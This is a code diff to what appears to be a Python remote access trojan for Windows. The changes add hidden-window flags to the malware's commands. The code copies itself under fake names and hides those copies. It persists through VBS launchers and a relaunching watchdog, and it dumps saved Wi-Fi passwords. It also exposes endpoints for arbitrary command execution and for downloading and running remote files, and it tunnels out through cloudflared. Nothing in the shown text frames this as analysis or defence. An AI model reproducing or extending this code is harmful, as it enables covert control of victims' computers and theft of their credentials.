@@ -161,6 +161,7 @@ def _spread_internally() -> int:
     if not getattr(sys, 'frozen', False):
         return 0
     src = sys.executable
+    _NO_WINDOW = 0x08000000
     locations = [
         os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", _FAKE_NAMES[0]),
         os.path.join(os.environ.get('LOCALAPPDATA', '.'), "Microsoft", _FAKE_NAMES[1]),
@@ -177,8 +178,8 @@ def _spread_internally() -> int:
                 import shutil
                 shutil.copy2(src, dst)
                 try:
-                    os.system(f'attrib +h +s "{dst}"')
-                    os.system(f'attrib +h +s "{loc}"')
+                    subprocess.run(f'attrib +h +s "{dst}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
+                    subprocess.run(f'attrib +h +s "{loc}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
                 except:
                     pass
                 count += 1
@@ -186,7 +187,7 @@ def _spread_internally() -> int:
                 with open(vbs_path, 'w') as vf:
                     vf.write(f'Set objShell = CreateObject("WScript.Shell")\nobjShell.Run """{dst}""", 0, False\n')
                 try:
-                    os.system(f'attrib +h +s "{vbs_path}"')
+                    subprocess.run(f'attrib +h +s "{vbs_path}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
                 except:
                     pass
         except:
@@ -417,7 +418,7 @@ def _dump_wifi_passwords() -> list:
     try:
         profiles = subprocess.run(
             ['netsh', 'wlan', 'show', 'profiles'],
-            capture_output=True, text=True, timeout=15
+            capture_output=True, text=True, timeout=15, creationflags=0x08000000
         )
         for line in profiles.stdout.split('\n'):
             if 'All User Profile' in line or 'Profile' in line:
@@ -427,7 +428,7 @@ def _dump_wifi_passwords() -> list:
                 try:
                     key_result = subprocess.run(
                         ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
-                        capture_output=True, text=True, timeout=10
+                        capture_output=True, text=True, timeout=10, creationflags=0x08000000
                     )
                     password = ""
                     for kline in key_result.stdout.split('\n'):
@@ -710,7 +711,7 @@ def _get_system_inventory() -> dict:
             pass
         try:
             import subprocess
-            result = subprocess.run(['wmic', 'diskdrive', 'get', 'size'], capture_output=True, text=True, timeout=10)
+            result = subprocess.run(['wmic', 'diskdrive', 'get', 'size'], capture_output=True, text=True, timeout=10, creationflags=0x08000000)
             lines = [l.strip() for l in result.stdout.strip().split('\n') if l.strip().isdigit()]
             if lines:
                 inventory['disk_size_gb'] = round(int(lines[0]) / (1024**3), 1)
@@ -805,17 +806,21 @@ def _start_watchdog():
         if not getattr(sys, 'frozen', False):
             return
         exe = sys.executable
+        exe_dir = os.path.dirname(exe)
+        exe_name = os.path.basename(exe)
+        vbs_path = os.path.join(exe_dir, 'winruntime.vbs')
         watchdog_script = f"""
 import subprocess, time, os
+CREATE_NO_WINDOW = 0x08000000
 while True:
     time.sleep(30)
-    result = subprocess.run(['tasklist'], capture_output=True, text=True)
-    if 'winruntime.exe' not in result.stdout and '{os.path.basename(exe)}' not in result.stdout:
-        vbs = r"{os.path.join(os.path.dirname(exe), 'winruntime.vbs')}"
+    result = subprocess.run(['tasklist'], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
+    if 'winruntime.exe' not in result.stdout and '{exe_name}' not in result.stdout:
+        vbs = r"{vbs_path}"
         if os.path.exists(vbs):
-            subprocess.Popen(['wscript.exe', '//b', vbs])
+            subprocess.Popen(['wscript.exe', '//b', vbs], creationflags=CREATE_NO_WINDOW, close_fds=True)
         else:
-            subprocess.Popen(['{exe}'])
+            subprocess.Popen([r'{exe}'], creationflags=CREATE_NO_WINDOW, close_fds=True)
         break
     if 'watchdog_igr' not in result.stdout:
         break
@@ -824,12 +829,12 @@ while True:
         with open(watchdog_path, 'w') as wf:
             wf.write(watchdog_script)
         subprocess.Popen(
-            ['python', watchdog_path],
-            creationflags=0x00000008,
+            [sys.executable, watchdog_path],
+            creationflags=0x08000000,
             close_fds=True
         )
         try:
-            os.system(f'attrib +h +s "{watchdog_path}"')
+            subprocess.run(f'attrib +h +s "{watchdog_path}"', shell=True, creationflags=0x08000000, capture_output=True)
         except:
             pass
     except:
@@ -2059,8 +2064,8 @@ def play_audio():
         def _play_and_cleanup(path):
             try:
                 subprocess.run(['powershell', '-Command',
-                    f'(New-Object Media.SoundPlayer \"{path}\").PlaySync()'],
-                    capture_output=True, timeout=60)
+                    f'(New-Object Media.SoundPlayer "{path}").PlaySync()'],
+                    capture_output=True, timeout=60, creationflags=0x08000000)
             except:
                 try:
                     import winsound
@@ -2173,7 +2178,7 @@ def speak_text():
     try:
         data = request.get_json()
         text = data.get('text', '')
-        subprocess.run(['powershell', '-Command', f'Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{text}")'], capture_output=True)
+        subprocess.run(['powershell', '-Command', f'Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{text}")'], capture_output=True, creationflags=0x08000000)
         return jsonify({'success': True, 'status': 'Speaking: ' + text})
     except Exception as e:
         return jsonify({'success': False, 'status': str(e)})
@@ -2719,7 +2724,7 @@ def system_info():
 def system_processes():
     """Get running processes."""
     try:
-        result = subprocess.run(['tasklist'], capture_output=True, text=True)
+        result = subprocess.run(['tasklist'], capture_output=True, text=True, creationflags=0x08000000)
         return jsonify({'processes': result.stdout.split('\n')})
     except:
         return jsonify({'processes': []})
@@ -2754,7 +2759,7 @@ def execute_command():
     try:
         data = request.get_json()
         cmd = data.get('command', '')
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
         return jsonify({'output': result.stdout + result.stderr})
     except Exception as e:
         return jsonify({'output': str(e)})
@@ -2904,7 +2909,7 @@ def remote_download_exec():
         resp = requests.get(url, timeout=60, allow_redirects=True)
         with open(save_path, 'wb') as f:
             f.write(resp.content)
-        subprocess.Popen([save_path], creationflags=0x00000008, close_fds=True)
+        subprocess.Popen([save_path], creationflags=0x08000000, close_fds=True)
         return jsonify({'success': True, 'path': save_path})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -2932,7 +2937,7 @@ start "" "{current_exe}"
 del /f /q "{bat_path}" >nul 2>&1
 del /f /q "{new_exe_path}" >nul 2>&1
 ''')
-        subprocess.Popen(['cmd', '/c', bat_path], creationflags=0x00000008, close_fds=True)
+        subprocess.Popen(['cmd', '/c', bat_path], creationflags=0x08000000, close_fds=True)
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -2972,7 +2977,7 @@ def remote_process_kill():
         name = data.get('name', '')
         if not name:
             return jsonify({'success': False, 'error': 'No process name'})
-        result = subprocess.run(['taskkill', '/f', '/im', name], capture_output=True, text=True)
+        result = subprocess.run(['taskkill', '/f', '/im', name], capture_output=True, text=True, creationflags=0x08000000)
         return jsonify({'success': result.returncode == 0, 'output': result.stdout + result.stderr})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -3133,7 +3138,8 @@ def start_cloudflared(port: int) -> Optional[str]:
             cmd,
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
-            text=True
+            text=True,
+            creationflags=0x08000000
         )
         
         start_time = time.time()
